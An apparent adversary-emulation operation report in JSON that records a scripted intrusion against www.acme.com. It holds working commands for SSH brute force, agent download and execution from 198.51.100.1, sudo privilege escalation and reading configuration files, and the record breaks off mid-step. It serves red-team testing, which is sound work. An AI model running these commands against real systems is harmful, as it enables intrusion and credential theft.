@@ -1,0 +1,1038 @@
+{
+    "adversary": {
+        "adversary_id": "b40fb8be-3009-4cd3-acfa-edc62a2ebff3",
+        "description": "aaa",
+        "id": 4,
+        "name": "aaa",
+        "phases": {
+            "0": [
+                {
+                    "ability_id": "c927fd39-7dd4-457a-a21b-918b0abc8c99",
+                    "adversary_map_id": 32,
+                    "cleanup": "",
+                    "description": "Get informations and store in file",
+                    "executor": "sh",
+                    "id": 49,
+                    "name": "Network Service Scanning",
+                    "parsers": [
+                        {
+                            "ability": 49,
+                            "id": 7,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 49,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 3,
+                                "source": "comp.host.name",
+                                "target": null
+                            },
+                            "id": 3,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "discovery",
+                    "technique_id": "T1046",
+                    "technique_name": "Network Service Scanning",
+                    "test": "bm1hcCAiI3tjb21wLmhvc3QubmFtZX0iIHwgZ3JlcCAib3BlbiI7"
+                }
+            ],
+            "1": [
+                {
+                    "ability_id": "2f1843dd-cca9-4b7c-a8c7-d860839db912",
+                    "adversary_map_id": 33,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "sh",
+                    "id": 26,
+                    "name": "Enumerate accounts wget",
+                    "parsers": [
+                        {
+                            "ability": 26,
+                            "id": 4,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 26,
+                            "payload": "user.txt"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "d2hpbGUgcmVhZCAtciBsaW5lOyBkbyBSRVNVTFQ9ImB3Z2V0IGVjaG8gaHR0cDovLyN7Y29tcC5ob3N0Lm5hbWV9L34kbGluZSAyPiYxfCBncmVwIC1vRiAnNDAzJ2AiOyBpZiBbIC1uICIke1JFU1VMVH0iIF07IHRoZW4gZWNobyAkbGluZTsgZmk7IGRvbmUgPCB1c2VyLnR4dDs="
+                }
+            ],
+            "3": [
+                {
+                    "ability_id": "f3f6df4d-37cd-43e6-bb2a-693e84e255c6",
+                    "adversary_map_id": 34,
+                    "cleanup": "",
+                    "description": "Brute Force on password with Hydra and worldlist",
+                    "executor": "sh",
+                    "id": 9,
+                    "name": "Hydra Brute Force",
+                    "parsers": [
+                        {
+                            "ability": 9,
+                            "id": 1,
+                            "module": "plugins.stockpile.app.parsers.hydra"
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 9,
+                            "payload": "rockyou.txt"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 9,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 1,
+                                "source": "comp.user.name",
+                                "target": null
+                            },
+                            "id": 1,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "credential-access",
+                    "technique_id": "T1110",
+                    "technique_name": "Brute Force",
+                    "test": "aHlkcmEgLWwgI3tjb21wLnVzZXIubmFtZX0gLVAgLi9yb2NreW91LnR4dCBzc2g6Ly8je2NvbXAuaG9zdC5uYW1lfSAtdCA0OyAKZWNobyAib2siOw=="
+                }
+            ],
+            "4": [
+                {
+                    "ability_id": "ae99b403-6e62-4025-9195-3f770b15ad69",
+                    "adversary_map_id": 35,
+                    "cleanup": "",
+                    "description": "Start 54ndc47",
+                    "executor": "sh",
+                    "id": 84,
+                    "name": "Start 54ndc47 with password",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 84,
+                            "enforcements": {
+                                "edge": "has_password",
+                                "requirement_id": 5,
+                                "source": "comp.user.name",
+                                "target": "comp.user.password"
+                            },
+                            "id": 5,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1184",
+                    "technique_name": "SSH Hijacking",
+                    "test": "c3NocGFzcyAtcCAje2NvbXAudXNlci5wYXNzd29yZH0gc3NoICAtbyBDb25uZWN0VGltZW91dD0zICN7Y29tcC51c2VyLm5hbWV9QCN7Y29tcC5ob3N0Lm5hbWV9ICJjdXJsIC1zayAtWCBQT1NUIC1IICdmaWxlOnNhbmRjYXQuZ28nIC1IICdwbGF0Zm9ybTpsaW51eCcgaHR0cDovLyN7YXR0YWNrZXIuYWRkci5zZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQgPiAvdG1wL3NhbmRjYXQtbGludXggJiYgY2htb2QgK3ggL3RtcC9zYW5kY2F0LWxpbnV4ICYmIC90bXAvc2FuZGNhdC1saW51eCAtc2VydmVyIGh0dHA6Ly8je2F0dGFja2VyLmFkZHIuc2VydmVyfSAtZ3JvdXAgbXlfZ3JvdXAgJiI="
+                }
+            ],
+            "5": [
+                {
+                    "ability_id": "0d7fd013-3310-4ff5-9c64-5cb99c282f46",
+                    "adversary_map_id": 36,
+                    "cleanup": "",
+                    "description": "View commands without password",
+                    "executor": "sh",
+                    "id": 42,
+                    "name": "Account Discovery",
+                    "parsers": [
+                        {
+                            "ability": 42,
+                            "id": 6,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "c3VkbyAtbCB8IGdyZXAgJyhyb290KSBOT1BBU1NXRDon"
+                },
+                {
+                    "ability_id": "c02a8d8d-d5d1-44ad-b6e7-33f2739be0dc",
+                    "adversary_map_id": 37,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "sh",
+                    "id": 53,
+                    "name": "View sudoers access",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "Y2F0IC9ldGMvc3Vkb2Vycw=="
+                }
+            ],
+            "6": [
+                {
+                    "ability_id": "37744f41-89d1-4994-9acd-504272fb0170",
+                    "adversary_map_id": 38,
+                    "cleanup": "",
+                    "description": "Sudo without password",
+                    "executor": "sh",
+                    "id": 80,
+                    "name": "Sudo",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 80,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 4,
+                                "source": "host.root.noPwd",
+                                "target": null
+                            },
+                            "id": 4,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1169",
+                    "technique_name": "Sudo without password",
+                    "test": "c3VkbyBhcHQtZ2V0IHVwZGF0ZSAtbyBBUFQ6OlVwZGF0ZTo6UHJlLUludm9rZTo6PSd1c2VybW9kIC1hRyBzdWRvICN7Y29tcC51c2VyLm5hbWV9Jzs="
+                }
+            ],
+            "7": [
+                {
+                    "ability_id": "0d7fd013-3310-4ff5-9c64-5cb99c282f46",
+                    "adversary_map_id": 39,
+                    "cleanup": "",
+                    "description": "View commands without password",
+                    "executor": "sh",
+                    "id": 42,
+                    "name": "Account Discovery",
+                    "parsers": [
+                        {
+                            "ability": 42,
+                            "id": 6,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "c3VkbyAtbCB8IGdyZXAgJyhyb290KSBOT1BBU1NXRDon"
+                },
+                {
+                    "ability_id": "c02a8d8d-d5d1-44ad-b6e7-33f2739be0dc",
+                    "adversary_map_id": 40,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "sh",
+                    "id": 53,
+                    "name": "View sudoers access",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "Y2F0IC9ldGMvc3Vkb2Vycw=="
+                }
+            ],
+            "8": [
+                {
+                    "ability_id": "37744f41-89d1-4994-9acd-504272fb0170",
+                    "adversary_map_id": 41,
+                    "cleanup": "",
+                    "description": "Sudo without password",
+                    "executor": "sh",
+                    "id": 80,
+                    "name": "Sudo",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 80,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 4,
+                                "source": "host.root.noPwd",
+                                "target": null
+                            },
+                            "id": 4,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1169",
+                    "technique_name": "Sudo without password",
+                    "test": "c3VkbyBhcHQtZ2V0IHVwZGF0ZSAtbyBBUFQ6OlVwZGF0ZTo6UHJlLUludm9rZTo6PSd1c2VybW9kIC1hRyBzdWRvICN7Y29tcC51c2VyLm5hbWV9Jzs="
+                }
+            ],
+            "9": [
+                {
+                    "ability_id": "8ed2e092-5302-4f7f-afd7-e83e296b23e4",
+                    "adversary_map_id": 42,
+                    "cleanup": "",
+                    "description": "Find config file",
+                    "executor": "sh",
+                    "id": 37,
+                    "name": "Config File Discovery",
+                    "parsers": [
+                        {
+                            "ability": 37,
+                            "id": 5,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 37,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 2,
+                                "source": null,
+                                "target": "comp.user.password"
+                            },
+                            "id": 2,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "discovery",
+                    "technique_id": "T1083",
+                    "technique_name": "File and Directory Discovery",
+                    "test": "ZWNobyAje2NvbXAudXNlci5wYXNzd29yZH0gfCBzdWRvIC1TIHN1IC1jICdmaW5kIC8gLW5hbWUgd3AtY29uZmlnLnBocCc="
+                }
+            ],
+            "10": [
+                {
+                    "ability_id": "f3f6df4d-37cd-43e6-bb2a-693e84e255c6",
+                    "adversary_map_id": 43,
+                    "cleanup": "",
+                    "description": "Brute Force on password with Hydra and worldlist",
+                    "executor": "sh",
+                    "id": 9,
+                    "name": "Hydra Brute Force",
+                    "parsers": [
+                        {
+                            "ability": 9,
+                            "id": 1,
+                            "module": "plugins.stockpile.app.parsers.hydra"
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 9,
+                            "payload": "rockyou.txt"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 9,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 1,
+                                "source": "comp.user.name",
+                                "target": null
+                            },
+                            "id": 1,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "credential-access",
+                    "technique_id": "T1110",
+                    "technique_name": "Brute Force",
+                    "test": "aHlkcmEgLWwgI3tjb21wLnVzZXIubmFtZX0gLVAgLi9yb2NreW91LnR4dCBzc2g6Ly8je2NvbXAuaG9zdC5uYW1lfSAtdCA0OyAKZWNobyAib2siOw=="
+                }
+            ],
+            "11": [
+                {
+                    "ability_id": "ae99b403-6e62-4025-9195-3f770b15ad69",
+                    "adversary_map_id": 44,
+                    "cleanup": "",
+                    "description": "Start 54ndc47",
+                    "executor": "sh",
+                    "id": 84,
+                    "name": "Start 54ndc47 with password",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 84,
+                            "enforcements": {
+                                "edge": "has_password",
+                                "requirement_id": 5,
+                                "source": "comp.user.name",
+                                "target": "comp.user.password"
+                            },
+                            "id": 5,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1184",
+                    "technique_name": "SSH Hijacking",
+                    "test": "c3NocGFzcyAtcCAje2NvbXAudXNlci5wYXNzd29yZH0gc3NoICAtbyBDb25uZWN0VGltZW91dD0zICN7Y29tcC51c2VyLm5hbWV9QCN7Y29tcC5ob3N0Lm5hbWV9ICJjdXJsIC1zayAtWCBQT1NUIC1IICdmaWxlOnNhbmRjYXQuZ28nIC1IICdwbGF0Zm9ybTpsaW51eCcgaHR0cDovLyN7YXR0YWNrZXIuYWRkci5zZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQgPiAvdG1wL3NhbmRjYXQtbGludXggJiYgY2htb2QgK3ggL3RtcC9zYW5kY2F0LWxpbnV4ICYmIC90bXAvc2FuZGNhdC1saW51eCAtc2VydmVyIGh0dHA6Ly8je2F0dGFja2VyLmFkZHIuc2VydmVyfSAtZ3JvdXAgbXlfZ3JvdXAgJiI="
+                }
+            ],
+            "12": [
+                {
+                    "ability_id": "0d7fd013-3310-4ff5-9c64-5cb99c282f46",
+                    "adversary_map_id": 45,
+                    "cleanup": "",
+                    "description": "View commands without password",
+                    "executor": "sh",
+                    "id": 42,
+                    "name": "Account Discovery",
+                    "parsers": [
+                        {
+                            "ability": 42,
+                            "id": 6,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "c3VkbyAtbCB8IGdyZXAgJyhyb290KSBOT1BBU1NXRDon"
+                },
+                {
+                    "ability_id": "c02a8d8d-d5d1-44ad-b6e7-33f2739be0dc",
+                    "adversary_map_id": 46,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "sh",
+                    "id": 53,
+                    "name": "View sudoers access",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "Y2F0IC9ldGMvc3Vkb2Vycw=="
+                }
+            ],
+            "13": [
+                {
+                    "ability_id": "37744f41-89d1-4994-9acd-504272fb0170",
+                    "adversary_map_id": 47,
+                    "cleanup": "",
+                    "description": "Sudo without password",
+                    "executor": "sh",
+                    "id": 80,
+                    "name": "Sudo",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 80,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 4,
+                                "source": "host.root.noPwd",
+                                "target": null
+                            },
+                            "id": 4,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1169",
+                    "technique_name": "Sudo without password",
+                    "test": "c3VkbyBhcHQtZ2V0IHVwZGF0ZSAtbyBBUFQ6OlVwZGF0ZTo6UHJlLUludm9rZTo6PSd1c2VybW9kIC1hRyBzdWRvICN7Y29tcC51c2VyLm5hbWV9Jzs="
+                }
+            ],
+            "14": [
+                {
+                    "ability_id": "c927fd39-7dd4-457a-a21b-918b0abc8c99",
+                    "adversary_map_id": 48,
+                    "cleanup": "",
+                    "description": "Get informations and store in file",
+                    "executor": "sh",
+                    "id": 49,
+                    "name": "Network Service Scanning",
+                    "parsers": [
+                        {
+                            "ability": 49,
+                            "id": 7,
+                            "module": "plugins.stockpile.app.parsers.basic"
+                        }
+                    ],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 49,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 3,
+                                "source": "comp.host.name",
+                                "target": null
+                            },
+                            "id": 3,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "discovery",
+                    "technique_id": "T1046",
+                    "technique_name": "Network Service Scanning",
+                    "test": "bm1hcCAiI3tjb21wLmhvc3QubmFtZX0iIHwgZ3JlcCAib3BlbiI7"
+                }
+            ],
+            "15": [
+                {
+                    "ability_id": "95c508cc-c9f6-4b25-8163-7e4def2ea6df",
+                    "adversary_map_id": 49,
+                    "cleanup": "",
+                    "description": "Locate files deemed sensitive",
+                    "executor": "sh",
+                    "id": 137,
+                    "name": "Collect data in files",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 137,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 8,
+                                "source": "host.file.config",
+                                "target": null
+                            },
+                            "id": 8,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "collection",
+                    "technique_id": "T1005",
+                    "technique_name": "Data from Local System",
+                    "test": "Y2F0ICN7aG9zdC5maWxlLmNvbmZpZ30="
+                }
+            ],
+            "16": [
+                {
+                    "ability_id": "95c508cc-c9f6-4b25-8163-7e4def2ea6df",
+                    "adversary_map_id": 50,
+                    "cleanup": "",
+                    "description": "Locate files deemed sensitive",
+                    "executor": "sh",
+                    "id": 137,
+                    "name": "Collect data in files",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 137,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 8,
+                                "source": "host.file.config",
+                                "target": null
+                            },
+                            "id": 8,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "collection",
+                    "technique_id": "T1005",
+                    "technique_name": "Data from Local System",
+                    "test": "Y2F0ICN7aG9zdC5maWxlLmNvbmZpZ30="
+                }
+            ],
+            "17": [
+                {
+                    "ability_id": "f3f6df4d-37cd-43e6-bb2a-693e84e255c6",
+                    "adversary_map_id": 51,
+                    "cleanup": "",
+                    "description": "Brute Force on password with Hydra and worldlist",
+                    "executor": "sh",
+                    "id": 9,
+                    "name": "Hydra Brute Force",
+                    "parsers": [
+                        {
+                            "ability": 9,
+                            "id": 1,
+                            "module": "plugins.stockpile.app.parsers.hydra"
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 9,
+                            "payload": "rockyou.txt"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 9,
+                            "enforcements": {
+                                "edge": null,
+                                "requirement_id": 1,
+                                "source": "comp.user.name",
+                                "target": null
+                            },
+                            "id": 1,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "credential-access",
+                    "technique_id": "T1110",
+                    "technique_name": "Brute Force",
+                    "test": "aHlkcmEgLWwgI3tjb21wLnVzZXIubmFtZX0gLVAgLi9yb2NreW91LnR4dCBzc2g6Ly8je2NvbXAuaG9zdC5uYW1lfSAtdCA0OyAKZWNobyAib2siOw=="
+                }
+            ],
+            "18": [
+                {
+                    "ability_id": "ae99b403-6e62-4025-9195-3f770b15ad69",
+                    "adversary_map_id": 52,
+                    "cleanup": "",
+                    "description": "Start 54ndc47",
+                    "executor": "sh",
+                    "id": 84,
+                    "name": "Start 54ndc47 with password",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [
+                        {
+                            "ability": 84,
+                            "enforcements": {
+                                "edge": "has_password",
+                                "requirement_id": 5,
+                                "source": "comp.user.name",
+                                "target": "comp.user.password"
+                            },
+                            "id": 5,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1184",
+                    "technique_name": "SSH Hijacking",
+                    "test": "c3NocGFzcyAtcCAje2NvbXAudXNlci5wYXNzd29yZH0gc3NoICAtbyBDb25uZWN0VGltZW91dD0zICN7Y29tcC51c2VyLm5hbWV9QCN7Y29tcC5ob3N0Lm5hbWV9ICJjdXJsIC1zayAtWCBQT1NUIC1IICdmaWxlOnNhbmRjYXQuZ28nIC1IICdwbGF0Zm9ybTpsaW51eCcgaHR0cDovLyN7YXR0YWNrZXIuYWRkci5zZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQgPiAvdG1wL3NhbmRjYXQtbGludXggJiYgY2htb2QgK3ggL3RtcC9zYW5kY2F0LWxpbnV4ICYmIC90bXAvc2FuZGNhdC1saW51eCAtc2VydmVyIGh0dHA6Ly8je2F0dGFja2VyLmFkZHIuc2VydmVyfSAtZ3JvdXAgbXlfZ3JvdXAgJiI="
+                }
+            ]
+        }
+    },
+    "facts": [
+        {
+            "id": 5,
+            "link_id": 0,
+            "property": "comp.host.name",
+            "relationships": [],
+            "score": 14,
+            "source_id": "2",
+            "value": "www.acme.com"
+        },
+        {
+            "id": 6,
+            "link_id": 0,
+            "property": "attacker.addr.server",
+            "relationships": [],
+            "score": 1,
+            "source_id": "2",
+            "value": "198.51.100.1:8888"
+        },
+        {
+            "id": 11,
+            "link_id": 6,
+            "property": "comp.user.name",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "helpdesk"
+        },
+        {
+            "id": 12,
+            "link_id": 9,
+            "property": "host.root.noPwd",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "    (root) NOPASSWD: /usr/bin/apt-get"
+        },
+        {
+            "id": 13,
+            "link_id": 13,
+            "property": "host.file.config",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "/var/www/html/wp-config.php"
+        },
+        {
+            "id": 14,
+            "link_id": 13,
+            "property": "host.file.config",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "[sudo] password for helpdesk: "
+        },
+        {
+            "id": 15,
+            "link_id": 14,
+            "property": "host.state.service",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "22/tcp open  ssh"
+        },
+        {
+            "id": 16,
+            "link_id": 14,
+            "property": "host.state.service",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "80/tcp open  http"
+        },
+        {
+            "id": 17,
+            "link_id": 16,
+            "property": "comp.user.password",
+            "relationships": [],
+            "score": 1,
+            "source_id": "4",
+            "value": "iloveyou"
+        }
+    ],
+    "finish": "2019-11-21 10:47:12",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                "sh",
+                "shellcode_amd64"
+            ],
+            "group": "my_group",
+            "last_seen": "2019-11-21 10:46:33",
+            "last_trusted_seen": "2019-11-21 10:42:05",
+            "location": "/tmp/sandcat-linux",
+            "paw": "laura$laura",
+            "pid": "32655",
+            "platform": "linux",
+            "ppid": "29933",
+            "server": "http://0.0.0.0:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": true
+        },
+        {
+            "architecture": "amd64",
+            "executors": [
+                "sh",
+                "shellcode_amd64"
+            ],
+            "group": "my_group",
+            "last_seen": "2019-11-21 10:46:23",
+            "last_trusted_seen": "2019-11-21 10:44:23",
+            "location": "/tmp/sandcat-linux",
+            "paw": "www$helpdesk",
+            "pid": "23396",
+            "platform": "linux",
+            "ppid": "1",
+            "server": "http://198.51.100.1:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": true
+        }
+    ],
+    "id": 4,
+    "jitter": "4/8",
+    "name": "a1",
+    "planner": "created from Crack",
+    "skipped_abilities": [
+        {
+            "laura$laura": [
+                {
+                    "ability_id": "0d7fd013-3310-4ff5-9c64-5cb99c282f46",
+                    "ability_name": "Account Discovery",
+                    "reason": "Agent untrusted",
+                    "reason_id": 4
+                },
+                {
+                    "ability_id": "c02a8d8d-d5d1-44ad-b6e7-33f2739be0dc",
+                    "ability_name": "View sudoers access",
+                    "reason": "Agent untrusted",
+                    "reason_id": 4
+                },
+                {
+                    "ability_id": "37744f41-89d1-4994-9acd-504272fb0170",
+                    "ability_name": "Sudo",
+                    "reason": "Agent untrusted",
+                    "reason_id": 4
+                },
+                {
+                    "ability_id": "95c508cc-c9f6-4b25-8163-7e4def2ea6df",
+                    "ability_name": "Collect data in files",
+                    "reason": "Agent untrusted",
+                    "reason_id": 4
+                }
+            ]
+        },
+        {
+            "www$helpdesk": [
+                {
+                    "ability_id": "95c508cc-c9f6-4b25-8163-7e4def2ea6df",
+                    "ability_name": "Collect data in files",
+                    "reason": "Agent untrusted",
+                    "reason_id": 4
+                }
+            ]
+        }
+    ],
+    "start": "2019-11-21 10:42:46",
+    "steps": {
+        "laura$laura": {
+            "steps": [
+                {
+                    "ability_id": "c927fd39-7dd4-457a-a21b-918b0abc8c99",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1046",
+                        "technique_name": "Network Service Scanning"
+                    },
+                    "command": "nmap \"www.acme.com\" | grep \"open\";",
+                    "delegated": "2019-11-21 10:43:05.200421",
+                    "description": "Get informations and store in file",
+                    "executor": "sh",
+                    "name": "Network Service Scanning",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:43:05",
+                    "status": 0
+                },
+                {
+                    "ability_id": "2f1843dd-cca9-4b7c-a8c7-d860839db912",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "while read -r line; do RESULT=\"`wget echo http://www.acme.com/~$line 2>&1| grep -oF '403'`\"; if [ -n \"${RESULT}\" ]; then echo $line; fi; done < user.txt;",
+                    "delegated": "2019-11-21 10:43:12.208287",
+                    "description": "",
+                    "executor": "sh",
+                    "name": "Enumerate accounts wget",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:43:12",
+                    "status": 0
+                },
+                {
+                    "ability_id": "f3f6df4d-37cd-43e6-bb2a-693e84e255c6",
+                    "attack": {
+                        "tactic": "credential-access",
+                        "technique_id": "T1110",
+                        "technique_name": "Brute Force"
+                    },
+                    "command": "hydra -l helpdesk -P ./rockyou.txt ssh://www.acme.com -t 4; echo \"ok\";",
+                    "delegated": "2019-11-21 10:43:18.216567",
+                    "description": "Brute Force on password with Hydra and worldlist",
+                    "executor": "sh",
+                    "name": "Hydra Brute Force",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:43:24",
+                    "status": 0
+                },
+                {
+                    "ability_id": "ae99b403-6e62-4025-9195-3f770b15ad69",
+                    "attack": {
+                        "tactic": "lateral-movement",
+                        "technique_id": "T1184",
+                        "technique_name": "SSH Hijacking"
+                    },
+                    "command": "sshpass -p iloveyou ssh  -o ConnectTimeout=3 helpdesk@www.acme.com \"curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://198.51.100.1:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://198.51.100.1:8888 -group my_group &\"",
+                    "delegated": "2019-11-21 10:44:23.228757",
+                    "description": "Start 54ndc47",
+                    "executor": "sh",
+                    "name": "Start 54ndc47 with password",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:45:23",
+                    "status": 124
+                },
+                {
+                    "ability_id": "8ed2e092-5302-4f7f-afd7-e83e296b23e4",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1083",
+                        "technique_name": "File and Directory Discovery"
+                    },
+                    "command": "echo iloveyou | sudo -S su -c 'find / -name wp-config.php'",
+                    "delegated": "2019-11-21 10:45:27.237936",
+                    "description": "Find config file",
+                    "executor": "sh",
+                    "name": "Config File Discovery",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:45:29",
+                    "status": 1
+                }
+            ]
+        },
+        "www$helpdesk": {
+            "steps": [
+                {
+                    "ability_id": "c927fd39-7dd4-457a-a21b-918b0abc8c99",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1046",
+                        "technique_name": "Network Service Scanning"
+                    },
+                    "command": "nmap \"www.acme.com\" | grep \"open\";",
+                    "delegated": "2019-11-21 10:46:23.549954",
+                    "description": "Get informations and store in file",
+                    "executor": "sh",
+                    "name": "Network Service Scanning",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:23",
+                    "status": 1
+                },
+                {
+                    "ability_id": "2f1843dd-cca9-4b7c-a8c7-d860839db912",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "while read -r line; do RESULT=\"`wget echo http://www.acme.com/~$line 2>&1| grep -oF '403'`\"; if [ -n \"${RESULT}\" ]; then echo $line; fi; done < user.txt;",
+                    "delegated": "2019-11-21 10:46:23.550224",
+                    "description": "",
+                    "executor": "sh",
+                    "name": "Enumerate accounts wget",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:27",
+                    "status": 0
+                },
+                {
+                    "ability_id": "f3f6df4d-37cd-43e6-bb2a-693e84e255c6",
+                    "attack": {
+                        "tactic": "credential-access",
+                        "technique_id": "T1110",
+                        "technique_name": "Brute Force"
+                    },
+                    "command": "hydra -l helpdesk -P ./rockyou.txt ssh://www.acme.com -t 4; echo \"ok\";",
+                    "delegated": "2019-11-21 10:46:23.550448",
+                    "description": "Brute Force on password with Hydra and worldlist",
+                    "executor": "sh",
+                    "name": "Hydra Brute Force",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:34",
+                    "status": 0
+                },
+                {
+                    "ability_id": "ae99b403-6e62-4025-9195-3f770b15ad69",
+                    "attack": {
+                        "tactic": "lateral-movement",
+                        "technique_id": "T1184",
+                        "technique_name": "SSH Hijacking"
+                    },
+                    "command": "sshpass -p iloveyou ssh  -o ConnectTimeout=3 helpdesk@www.acme.com \"curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://198.51.100.1:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://198.51.100.1:8888 -group my_group &\"",
+                    "delegated": "2019-11-21 10:46:23.550662",
+                    "description": "Start 54ndc47",
+                    "executor": "sh",
